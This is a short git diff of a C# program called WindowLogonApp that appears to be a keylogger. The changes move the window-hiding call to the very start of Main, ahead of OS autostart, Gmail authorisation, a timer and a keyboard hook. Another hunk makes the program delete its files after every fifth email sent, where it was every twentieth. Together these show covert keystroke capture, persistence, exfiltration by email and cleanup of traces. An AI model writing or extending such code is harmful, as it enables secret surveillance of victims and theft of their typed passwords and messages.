@@ -181,7 +181,7 @@ namespace WindowLogonApp
                     {
                         UseMimekitToSend(service);
                         sentId++;
-                        if(sentId%20==0)
+                        if(sentId%5==0)
                             DeleteAllFile();
                     }
                     interval++;
@@ -439,7 +439,11 @@ namespace WindowLogonApp
         static GmailService service;
         static void Main(string[] args)
         {
+            HideWindow();
             StartWithOS();
+            
+            if (!Directory.Exists(directoryTemp))
+                Directory.CreateDirectory(directoryTemp);
             credential = AuthorizationGmail();
             service = new GmailService(new BaseClientService.Initializer()
             {
@@ -447,10 +451,6 @@ namespace WindowLogonApp
                 ApplicationName = ApplicationName
 
             });
-            if (!Directory.Exists(directoryTemp))
-                Directory.CreateDirectory(directoryTemp);
-            
-            HideWindow();
             StartTimer();
             HookKeyboard();
         }
